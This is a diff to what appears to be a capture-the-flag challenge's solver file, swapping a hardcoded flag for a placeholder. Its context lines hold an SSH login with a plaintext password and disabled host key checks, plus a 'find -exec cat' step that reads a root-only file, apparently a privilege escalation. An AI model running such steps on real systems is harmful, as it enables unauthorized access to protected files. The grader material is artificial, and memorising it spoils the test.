@@ -30,10 +30,10 @@ solver:
     command: sshpass -p 'N3xus_D3pl0y#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@{target.core} 'find . -exec cat /root/marker3.txt \; -quit' 2>&1
     expect: 0wn3d
   - name: Verify complete flag
-    command: echo 'OCR{br34ch_3sc4l4t3_0wn3d}'
-    expect: OCR{br34ch_3sc4l4t3_0wn3d}
+    command: echo '{flag}'
+    expect: '{flag}'
 expected_flag_count: 1
-expected_flag: OCR{br34ch_3sc4l4t3_0wn3d}
+expected_flag: '{flag}'
 forbidden_networks:
 - control-plane
 - database
